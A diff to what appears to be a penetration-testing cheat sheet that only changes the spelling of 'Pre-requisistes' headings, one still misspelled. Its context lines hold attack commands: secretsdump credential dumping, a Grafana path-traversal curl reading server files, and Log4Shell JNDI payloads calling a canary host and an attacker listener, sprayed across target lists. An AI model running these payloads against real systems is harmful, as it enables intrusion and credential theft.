@@ -412,7 +412,7 @@ $ secretsdump.py -just-dc -no-pass <HANDLE>\$@<RHOST>
 
 > https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
 
-### Pre-requisistes
+### Prerequisistes
 
 - Ubuntu 20.04 (Sudo 1.8.31)
 - Debian 10 (Sudo 1.8.27)
@@ -448,7 +448,7 @@ $ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure
 
 > https://vulncheck.com/blog/grafana-cve-2021-43798
 
-### Pre-requisistes
+### Prerequisistes
 
 - Grafana 8.0.0-beta1 > 8.3.0
 
@@ -467,7 +467,7 @@ $ curl 'http://<RHOST>:3000/public/plugins/welcome/../../../../../../../../var/l
 $ cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
 ```
 
-### Pre-requisistes
+### Prerequisistes
 
 > https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
@@ -566,7 +566,7 @@ ${jndi:ldap://<LHOST>:1389/ci1dfd}
 
 > https://github.com/kozmer/log4j-shell-poc
 
-##### Pre-requisistes
+##### Prerequisistes
 
 > https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
